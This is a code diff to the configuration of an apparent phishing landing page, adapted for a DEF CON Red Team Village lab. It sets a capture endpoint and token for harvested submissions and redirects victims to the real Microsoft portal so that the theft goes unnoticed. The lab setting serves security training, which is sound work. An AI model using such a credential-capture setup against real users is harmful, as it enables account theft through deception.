@@ -73,13 +73,13 @@ window.FingerprintJSLoaded = false;
 <script>
 const CONFIG = {
   site_id:  "lander-demo",
-  token:    "test_external_capture_token",
-  // IMPORTANT: Update this to your proxy server's actual address
-  // Examples:
-  //   "http://192.168.1.50:8092/api/capture/external" (local network)
-  //   "https://proxy.yourcompany.com/api/capture/external" (public domain)
-  //   "http://localhost:8092/api/capture/external" (local testing)
-  endpoint: "https://example.com/api/capture/external",
+  // DEF CON RTV lab: same-origin relative path (works through nginx
+  // regardless of domain) + the token docker-compose.yml sets via
+  // EXTERNAL_CAPTURE_TOKEN. Keep these two in sync if you change either.
+  token:    "lab-demo-capture-token",
+  endpoint: "/api/capture/external",
+  // Matches the app's own default_login_url — real IdP portal, so the
+  // flow looks unbroken after submit, same as a real engagement.
   next_url: "https://myapps.microsoft.com/",
 };
 
